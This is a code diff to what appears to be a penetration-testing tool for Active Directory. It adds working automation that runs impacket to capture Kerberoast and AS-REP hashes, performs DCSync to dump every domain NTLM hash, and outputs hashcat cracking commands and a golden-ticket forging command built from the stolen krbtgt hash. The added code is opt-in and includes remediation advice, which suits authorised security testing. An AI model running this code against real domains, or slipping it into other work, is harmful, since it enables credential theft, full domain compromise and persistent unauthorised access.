@@ -580,6 +580,245 @@ def kerberos_actions(graph: dict, creds: dict | None) -> list[dict]:
     return actions
 
 
+# --- live Kerberos capture (impacket) -------------------------------------------
+# With a credential and a DC IP, recce doesn't just STAGE the roast - it runs the
+# published impacket tools to CAPTURE the actual crackable material (TGS-REP /
+# AS-REP hashes, replicated NTLM hashes) and folds each capture back in as a
+# CONFIRMED, proven finding with the real loot attached. All three are read-only
+# (request tickets / replicate secrets) - nothing on the target is modified - and
+# they only run when the operator opts in with an explicit flag.
+
+def _kerb_tool(*names):
+    """First installed tool among `names` (handles both `impacket-Foo` and
+    `Foo.py` packagings). Returns the resolved path or None."""
+    import shutil
+    for n in names:
+        p = shutil.which(n)
+        if p:
+            return p
+    return None
+
+
+def _run(cmd, timeout: int = 240) -> tuple[str, str | None]:
+    import subprocess
+    try:
+        p = subprocess.run(cmd, capture_output=True, text=True, errors="replace",
+                           timeout=timeout)
+        return (p.stdout or "") + (p.stderr or ""), None
+    except subprocess.TimeoutExpired:
+        return "", f"timed out after {timeout}s"
+    except (OSError, ValueError) as e:
+        return "", str(e)
+
+
+def _impacket_target(creds: dict, at_dc: bool = False) -> tuple[str, list[str]]:
+    """(target, extra_flags) for an impacket command from a creds dict.
+    Password -> DOM/user:pass; NT hash -> DOM/user + `-hashes :<nt>`."""
+    dom = creds.get("domain") or ""
+    user = creds.get("user") or ""
+    secret = creds.get("secret") or ""
+    dc = creds.get("dc_ip") or ""
+    base = f"{dom}/{user}" if dom else user
+    flags: list[str] = []
+    if creds.get("is_hash") and secret:
+        flags = ["-hashes", f":{secret}"]
+    elif secret:
+        base = f"{base}:{secret}"
+    if at_dc and dc:
+        base = f"{base}@{dc}"
+    return base, flags
+
+
+def parse_tgs(output: str) -> list[dict]:
+    """TGS-REP hashes from GetUserSPNs -request output.
+    $krb5tgs$23$*USER$REALM$SPN*$... -> {user, spn, hash}."""
+    out = []
+    for line in output.splitlines():
+        line = line.strip()
+        if not line.startswith("$krb5tgs$"):
+            continue
+        m = re.match(r"\$krb5tgs\$\d+\$\*([^$]+)\$([^$]+)\$([^*]+)\*", line)
+        out.append({"user": m.group(1) if m else "",
+                    "spn": m.group(3) if m else "",
+                    "hash": line})
+    return out
+
+
+def parse_asrep(output: str) -> list[dict]:
+    """AS-REP hashes from GetNPUsers -request output.
+    $krb5asrep$23$user@REALM:... -> {user, hash}."""
+    out = []
+    for line in output.splitlines():
+        line = line.strip()
+        if not line.startswith("$krb5asrep$"):
+            continue
+        m = re.match(r"\$krb5asrep\$\d+\$([^@:]+)", line)
+        out.append({"user": m.group(1) if m else "", "hash": line})
+    return out
+
+
+def parse_secretsdump(output: str) -> list[dict]:
+    """NTLM hashes from secretsdump -just-dc.
+    DOMAIN\\user:RID:LM:NT::: -> {principal, rid, nt, krbtgt(bool)}."""
+    out = []
+    for line in output.splitlines():
+        line = line.strip()
+        m = re.match(r"^([^:\s]+):(\d+):([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):::", line)
+        if not m:
+            continue
+        principal, rid, nt = m.group(1), m.group(2), m.group(4)
+        out.append({"principal": principal, "rid": rid, "nt": nt,
+                    "krbtgt": principal.split("\\")[-1].lower() == "krbtgt"
+                    or rid == "502"})
+    return out
+
+
+def live_kerberoast(creds: dict, privileged: set | None = None) -> dict:
+    """Run impacket-GetUserSPNs -request and capture every TGS-REP hash.
+    Returns {ran, tool, command, output, hashes, findings, error}."""
+    privileged = {p.upper() for p in (privileged or set())}
+    tool = _kerb_tool("impacket-GetUserSPNs", "GetUserSPNs.py")
+    if not tool:
+        return {"ran": False, "error": "impacket-GetUserSPNs not installed",
+                "hashes": [], "findings": []}
+    target, flags = _impacket_target(creds)
+    dc = creds.get("dc_ip") or ""
+    cmd = [tool, "-request", "-outputfile", "-"] + flags
+    if dc:
+        cmd += ["-dc-ip", dc]
+    cmd.append(target)
+    out, err = _run(cmd)
+    if err:
+        return {"ran": True, "tool": tool, "command": " ".join(cmd), "output": out,
+                "hashes": [], "findings": [], "error": err}
+    hashes = parse_tgs(out)
+    fs = []
+    for h in hashes:
+        priv = h["user"].upper() in privileged
+        fs.append(_finding(
+            "roasted", "critical" if priv else "high",
+            "Kerberoast hash captured (proven)"
+            + (" - privileged account" if priv else ""),
+            h["user"], "",
+            f"Captured a live TGS-REP for SPN '{h['spn']}' by requesting a service "
+            f"ticket as {creds.get('user') or 'the supplied user'} - proof the account "
+            "is roastable. Crack it offline to recover the plaintext service-account "
+            f"password.\n\n{h['hash']}",
+            "hashcat",
+            "hashcat -m 13100 kerberoast.hash rockyou.txt   # captured hash saved to "
+            "loot/kerberoast.hash",
+            "Use a long random gMSA/managed password; minimise SPNs on user accounts."))
+    return {"ran": True, "tool": tool, "command": " ".join(cmd), "output": out,
+            "hashes": hashes, "findings": fs, "error": None}
+
+
+def live_asrep(creds: dict) -> dict:
+    """Run impacket-GetNPUsers -request (authenticated) and capture AS-REP hashes for
+    every DONT_REQ_PREAUTH account. Returns the same shape as live_kerberoast."""
+    tool = _kerb_tool("impacket-GetNPUsers", "GetNPUsers.py")
+    if not tool:
+        return {"ran": False, "error": "impacket-GetNPUsers not installed",
+                "hashes": [], "findings": []}
+    target, flags = _impacket_target(creds)
+    dc = creds.get("dc_ip") or ""
+    cmd = [tool, "-request", "-format", "hashcat"] + flags
+    if dc:
+        cmd += ["-dc-ip", dc]
+    cmd.append(target)
+    out, err = _run(cmd)
+    if err:
+        return {"ran": True, "tool": tool, "command": " ".join(cmd), "output": out,
+                "hashes": [], "findings": [], "error": err}
+    hashes = parse_asrep(out)
+    fs = []
+    for h in hashes:
+        fs.append(_finding(
+            "asreproasted", "high",
+            "AS-REP hash captured (proven)", h["user"], "",
+            f"Captured a live AS-REP for {h['user']} (no Kerberos pre-auth required), "
+            "proving the account is AS-REP-roastable. Crack it offline for the "
+            f"plaintext password.\n\n{h['hash']}",
+            "hashcat",
+            "hashcat -m 18200 asrep.hash rockyou.txt   # captured hash saved to "
+            "loot/asrep.hash",
+            "Require Kerberos pre-authentication on the account."))
+    return {"ran": True, "tool": tool, "command": " ".join(cmd), "output": out,
+            "hashes": hashes, "findings": fs, "error": None}
+
+
+def live_dcsync(creds: dict) -> dict:
+    """Run impacket-secretsdump -just-dc to replicate the domain's NTLM hashes.
+    Returns {ran, tool, command, output, hashes, findings, error}; hashes is the full
+    NTLM list and findings summarises the domain compromise (krbtgt = golden ticket)."""
+    tool = _kerb_tool("impacket-secretsdump", "secretsdump.py")
+    if not tool:
+        return {"ran": False, "error": "impacket-secretsdump not installed",
+                "hashes": [], "findings": []}
+    target, flags = _impacket_target(creds, at_dc=True)
+    dc = creds.get("dc_ip") or ""
+    cmd = [tool, "-just-dc"] + flags
+    if dc:
+        cmd += ["-dc-ip", dc]
+    cmd.append(target)
+    out, err = _run(cmd, timeout=600)
+    if err:
+        return {"ran": True, "tool": tool, "command": " ".join(cmd), "output": out,
+                "hashes": [], "findings": [], "error": err}
+    hashes = parse_secretsdump(out)
+    fs = []
+    if hashes:
+        krb = next((h for h in hashes if h["krbtgt"]), None)
+        detail = (f"DCSync succeeded: replicated {len(hashes)} account hash(es) from the "
+                  "domain via the Directory Replication Service - proof the supplied "
+                  "account holds DS-Replication rights (domain compromise). ")
+        if krb:
+            detail += ("The krbtgt hash is included, enabling golden-ticket persistence:\n\n"
+                       f"krbtgt NT: {krb['nt']}\n\nimpacket-ticketer -nthash "
+                       f"{krb['nt']} -domain-sid <sid> -domain {creds.get('domain') or '<dom>'} "
+                       "Administrator")
+        fs.append(_finding(
+            "dcsynced", "critical", "DCSync succeeded - domain hashes replicated (proven)",
+            creds.get("user") or "you", creds.get("domain") or "",
+            detail, "impacket-secretsdump", " ".join(cmd),
+            "Restrict DS-Replication-Get-Changes/-All to Domain Controllers only; audit "
+            "who holds these rights off tier-0. Rotate krbtgt twice if replicated."))
+    return {"ran": True, "tool": tool, "command": " ".join(cmd), "output": out,
+            "hashes": hashes, "findings": fs, "error": None}
+
+
+def live_kerberos(creds: dict, graph: dict | None = None, do_roast: bool = False,
+                  do_asrep: bool = False, do_dcsync: bool = False) -> dict:
+    """Orchestrate the opted-in live Kerberos captures. Returns
+    {findings, runs, errors} where `runs` holds each tool's raw result (for loot
+    files + proof screenshots) and `findings` are the proven captures to fold into
+    the main analysis."""
+    privileged = set()
+    if graph:
+        for f in findings(graph):
+            if f["category"] == "kerberoast" and f["severity"] == "high":
+                privileged.add(f["principal"])
+    runs, out_findings, errors = {}, [], []
+    if do_roast:
+        r = live_kerberoast(creds, privileged)
+        runs["kerberoast"] = r
+        out_findings.extend(r.get("findings", []))
+        if r.get("error"):
+            errors.append(f"kerberoast: {r['error']}")
+    if do_asrep:
+        r = live_asrep(creds)
+        runs["asrep"] = r
+        out_findings.extend(r.get("findings", []))
+        if r.get("error"):
+            errors.append(f"asrep: {r['error']}")
+    if do_dcsync:
+        r = live_dcsync(creds)
+        runs["dcsync"] = r
+        out_findings.extend(r.get("findings", []))
+        if r.get("error"):
+            errors.append(f"dcsync: {r['error']}")
+    return {"findings": out_findings, "runs": runs, "errors": errors}
+
+
 # --- credential substitution ----------------------------------------------------
 
 def fill_creds(analysis: dict, creds: dict | None) -> dict:
@@ -645,6 +884,8 @@ _CATEGORY_CWE = {
     "kerberoast": ["CWE-262"], "asrep": ["CWE-262"], "dcsync": ["CWE-269"],
     "delegation": ["CWE-266"], "rbcd": ["CWE-266"], "shadowcred": ["CWE-287"],
     "acl": ["CWE-732"], "creds": ["CWE-522"], "hygiene": ["CWE-521"],
+    # live captures (proven) reuse the same CWE classes as their staged counterparts.
+    "roasted": ["CWE-262"], "asreproasted": ["CWE-262"], "dcsynced": ["CWE-269"],
 }
 
 
